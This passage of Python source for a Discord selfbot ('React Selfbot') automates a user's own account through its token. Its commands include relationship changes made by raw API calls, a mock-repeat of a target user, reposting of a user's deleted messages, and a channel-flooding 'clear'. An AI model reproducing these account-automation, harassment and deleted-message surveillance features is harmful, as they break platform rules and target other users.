        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="motd", description="Displays React Selfbot MOTD")
    async def motd(ctx):
        motd = requests.get("https://reactselfbot.pro/api/info.php").json()['motd']
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'React Selfbot Message of the Day', description=f'{motd}',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="randomusername", description="Generates a random username")
    async def randomusername(ctx):
        randomusername = requests.get('https://api.leaked.wiki/randomuser?json=yes').json()['output']
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Random Username', description=f'{randomusername}',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="host2ip <Domain>", description="Shows IP of host")
    async def host2ip(ctx, host):
        ip = requests.get(f'https://api.leaked.wiki/host2ip?domain={urllib.parse.quote(host)}&json=yes').json()['output']
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'IP of host {host}', description=f'{ip}',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


                    
    @React.command(usage="animate <Text>", description="Animates text")
    async def animate(ctx, *, text):
        try:
            message = f'{text[0]}'
            msg = await ctx.send(message)
            for c in text[1:]:
                message += c
                await msg.edit(content=message)
                await asyncio.sleep(0.5)
        except Exception:
            return

    @React.command(usage="count <From> <To>", description="Counts from one number to another")
    async def count(ctx, _from: int, _to: int):
        try:
            first = _from
            msg = await ctx.send(first)
            for i in range((first + 1), (_to + 1)):
                await msg.edit(content=i)
                await asyncio.sleep(0.5)
        except Exception:
            pass
            
    @React.command(usage="countdown <From> <To>", description="Counts from one number to another (down)")
    async def countdown(ctx, _from: int, _to: int):
        try:
            first = _from
            msg = await ctx.send(first)
            for i in range((first - 1), (_to - 1), -1):
                await msg.edit(content=i)
                await asyncio.sleep(0.5)
        except Exception:
            pass
        
    @React.command(usage="creeper", description="Sends an infinite creeper gif")
    async def creeper(ctx):
        await ctx.send('https://reactselfbot.pro/Creeper.webm')
        
    @React.command(usage="addfriend <User>", description="Adds someone as a friend")
    async def addfriend(ctx, user: discord.User):
        try:
            requests.put(f'https://canary.discord.com/api/v8/users/@me/relationships/{user.id}', json={}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Settings',timestamp=embed_timestamp())
            embed.add_field(name=f'Added Friend', value=f'{user.name}#{user.discriminator}', inline=True)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except:
            pass
        
    @React.command(usage="block <User>", description="Blocks a user")
    async def block(ctx, user: discord.User):
        try:
            requests.put(f'https://canary.discord.com/api/v8/users/@me/relationships/{user.id}', json={'type': 2}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Settings',timestamp=embed_timestamp())
            embed.add_field(name=f'Blocked User', value=f'{user.name}#{user.discriminator}', inline=True)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except:
            pass
        
    @React.command(aliases=['unfriend'], usage="unblock <User>", description="Unblocks a user")
    async def unblock(ctx, user: discord.User):
        try:
            requests.delete(f'https://canary.discord.com/api/v8/users/@me/relationships/{user.id}', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Settings',timestamp=embed_timestamp())
            embed.add_field(name=f'Unblocked/Unfriended User', value=f'{user.name}#{user.discriminator}', inline=True)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except:
            pass
        
    @React.command(usage="dm <User> <Text>", description="Sends a direct message to an user (Bypasses if you have blocked the user)")
    async def dm(ctx, user: discord.User, *, msg):
        try:
            await user.send(msg)
        except:
            pass
        
    @React.command(usage="clearpings <Server ID>", description="Clears all pings of an server")
    async def clearpings(ctx, server):
        try:
            if server.lower() == 'all':
                guilds = requests.get('https://canary.discordapp.com/api/v8/users/@me/guilds', headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}).json()
                for guild in range(0, len(guilds)):
                    guild_id = guilds[guild]['id']
                    try:
                        server = discord.utils.get(ctx.bot.guilds, id=int(guild_id))
                        await server.ack()
                        asyncio.sleep(5)
                    except Exception:
                        pass
            else:
                server = discord.utils.get(ctx.bot.guilds, id=int(server))
                await server.ack()
        except Exception:
            pass
        
    @React.command(name='qrcode', aliases=['qr'], usage="qrcode <Text>", description="Generates a QR Code image with the specified text")
    async def _qrcode(ctx, *, text):
        try:
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=10,
                border=4,
            )
            qr.add_data(text)
            qr.make(fit=True)
            img = qr.make_image(fill_color='black', back_color='white')
            filename = f'qr.png'
            img.save(filename)
            await ctx.send(file=discord.File(fp=filename, filename=filename))
            if os.path.exists(filename):
                os.remove(filename)
        except Exception:
            pass
        
    @React.command(usage="copyuser <User>", description="Repeats everything the user types")
    async def copyuser(ctx, user: discord.User):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Copy User', description=f'Now copying {user}',timestamp=embed_timestamp())
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        await embed_or_codeblock(ctx, embed)


        copyarray.append(user)
        
    @React.command(usage="stopcopy <User>", description="Stops repeating the user")
    async def stopcopy(ctx, user: discord.User):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Copy User', description=f'Not copying {user} anymore',timestamp=embed_timestamp())
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        await embed_or_codeblock(ctx, embed)


        copyarray.remove(user)
        
    @React.command(usage="deletesend <User>", description="Sends every message a user deletes")
    async def deletesend(ctx, user: discord.User):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Delete Send', description=f'Now sending {user}\'s deleted messages.',timestamp=embed_timestamp())
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        await embed_or_codeblock(ctx, embed)


        deletesend_array.append(user)
        
    @React.command(usage="stopdeletesend <User>", description="Stop sending every message a user deletes")
    async def stopdeletesend(ctx, user: discord.User):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Delete Send', description=f'Not sending {user}\'s deleted messages anymore.',timestamp=embed_timestamp())
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        await embed_or_codeblock(ctx, embed)


        deletesend_array.remove(user)
        
    @React.command(usage="copymock <User>", description="Repeats everything the user types in a mocking way")
    async def copymock(ctx, user: discord.User):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Mock User', description=f'Now mocking {user}',timestamp=embed_timestamp())
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        await embed_or_codeblock(ctx, embed)


        mockarray.append(user)
        
    @React.command(usage="stopcopymock <User>", description="Stops copymocking the user")
    async def stopcopymock(ctx, user: discord.User):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Mock User', description=f'Not mocking {user} anymore',timestamp=embed_timestamp())
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        await embed_or_codeblock(ctx, embed)


        mockarray.remove(user)
        
    @React.command(usage="clear", description="Clear the chat without permissions")
    async def clear(ctx):
        await ctx.send('''
Ôæ†Ôæ†















































































































































































































































































































































































































Ôæ†Ôæ†''')
        
    @React.command(usage="stopcopyall", description="Stops repeating the all users")
    async def stopcopyall(ctx):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Copy User', description=f'Not copying anyone anymore',timestamp=embed_timestamp())
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        await embed_or_codeblock(ctx, embed)


        copyarray.clear()
        
    @React.command(usage="webopen <URL>", description="Opens an URL in your web browser")
    async def webopen(ctx, website: str):
        webbrowser.open(website)
        
    @React.command(usage="clap <Sentence>", description="Puts a clap emoji between each word")
    async def clap(ctx, *, sentence: str):
        await ctx.send(sentence.replace(' ', ' :clap: '))
        
    @React.command(usage="cap <Sentence>", description="Puts a cap emoji between each word")
    async def cap(ctx, *, sentence: str):
        await ctx.send(sentence.replace(' ', ' :billed_cap: '))
    
    @React.command(usage="semoji <Emoji> <Sentence>", description="Puts a custom emoji between each word")
    async def semoji(ctx, emoji: str, *, sentence: str):
        try:
            await ctx.send(sentence.replace(' ', f' {str(emoji)} '))
        except Exception:
            pass
    
    @React.command(usage="passwordgen", description="Generates a secure password")
    async def passwordgen(ctx):
        password_chars = string.ascii_letters + string.digits + string.punctuation
        password = []
        for x in range(16):
            password.append(random.choice(password_chars))
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Password Generator',timestamp=embed_timestamp())
        embed.add_field(name=f'__üîë Generated Password__', value=f'`{"".join(password)}`', inline=False)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="wyr", description="Posts a Would you Rather embed")
    async def wyr(ctx):
        r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
        soup = BeautifulSoup(r, 'html.parser')
        qa = soup.find(id='qa').text
        qor = soup.find(id='qor').text
        qb = soup.find(id='qb').text
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Would you Rather', description=f'üÖ∞Ô∏è: {qa}\n**{qor}**\nüÖ±Ô∏è: {qb}',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        msg = await ctx.send(embed=em)
        await msg.add_reaction('üÖ∞Ô∏è')
        await msg.add_reaction('üÖ±Ô∏è')
        
    @React.command(usage="topic", description="Changes the topic")
    async def topic(ctx):
        r = requests.get('https://www.conversationstarters.com/generator.php').content
        soup = BeautifulSoup(r, 'html.parser')
        topic = soup.find(id="random").text
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Topic',timestamp=embed_timestamp())
        em.add_field(name=f'New Topic', value=f'{topic}', inline=True)
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)


        
    @React.command(usage="emojify <Text>", description="Converts text into emojis")
    async def emojify(ctx, *, msg):
        if msg != None:
            out = msg.lower()
            text = out.replace(' ', '    ').replace('10', '\u200B:keycap_ten:')\
                    .replace('ab', '\u200BüÜé').replace('cl', '\u200BüÜë')\
                    .replace('0', '\u200B:zero:').replace('1', '\u200B:one:')\
                    .replace('2', '\u200B:two:').replace('3', '\u200B:three:')\
                    .replace('4', '\u200B:four:').replace('5', '\u200B:five:')\
                    .replace('6', '\u200B:six:').replace('7', '\u200B:seven:')\
                    .replace('8', '\u200B:eight:').replace('9', '\u200B:nine:')\
                    .replace('!', '\u200B‚ùó').replace('?', '\u200B‚ùì')\
                    .replace('vs', '\u200BüÜö').replace('.', '\u200Büî∏')\
                    .replace(',', 'üîª').replace('a', '\u200BüÖ∞')\
                    .replace('b', '\u200BüÖ±').replace('c', '\u200Büá®')\
                    .replace('d', '\u200Büá©').replace('e', '\u200Büá™')\
                    .replace('f', '\u200Büá´').replace('g', '\u200Büá¨')\
                    .replace('h', '\u200Büá≠').replace('i', '\u200BüáÆ')\
                    .replace('j', '\u200BüáØ').replace('k', '\u200Büá∞')\
                    .replace('l', '\u200Büá±').replace('m', '\u200Büá≤')\
                    .replace('n', '\u200Büá≥').replace('√±', '\u200Büá≥')\
                    .replace('o', '\u200BüÖæ').replace('p', '\u200BüÖø')\
                    .replace('q', '\u200Büá∂').replace('r', '\u200Büá∑')\
                    .replace('s', '\u200Büá∏').replace('t', '\u200Büáπ')\
                    .replace('u', '\u200Büá∫').replace('v', '\u200Büáª')\
                    .replace('w', '\u200Büáº').replace('x', '\u200BüáΩ')\
                    .replace('y', '\u200Büáæ').replace('z', '\u200Büáø')
            await ctx.send(text)
        else:
            return

    @React.command(pass_context=True)
    async def morsetable(ctx):
        to_morse = { 
        "a" : ".-",
        "b" : "-...",
        "c" : "-.-.",
        "d" : "-..",
        "e" : ".",
        "f" : "..-.",
        "g" : "--.",
        "h" : "....",
        "i" : "..",
        "j" : ".---",
        "k" : "-.-",
        "l" : ".-..",
        "m" : "--",
        "n" : "-.",
        "o" : "---",
        "p" : ".--.",
        "q" : "--.-",
        "r" : ".-.",
        "s" : "...",
        "t" : "-",
        "u" : "..-",
        "v" : "...-",
        "w" : ".--",
        "x" : "-..-",
        "y" : "-.--",
        "z" : "--..",
        "1" : ".----",
        "2" : "..---",
        "3" : "...--",
        "4" : "....-",
        "5" : ".....",
        "6" : "-....",
        "7" : "--...",
        "8" : "---..",
        "9" : "----.",
        "0" : "-----"
        }
        try:
            num_per_row = int(num_per_row)
        except Exception:
            num_per_row = 5
        
        msg = ""
        max_length = 0
        current_row = 0
        row_list = [[]]
        cur_list = []
        sorted_list = sorted(to_morse)
        for key in sorted_list:
            entry = "{} : **{}**\n".format(key.upper(), to_morse[key])
            if len(entry) > max_length:
                max_length = len(entry)
            row_list[len(row_list)-1].append(entry)
            if len(row_list[len(row_list)-1]) >= num_per_row:
                row_list.append([])
                current_row += 1
        
        for row in row_list:
            for entry in row:
                entry = entry.ljust(max_length)
                msg += entry + "  "
            msg += ""
        
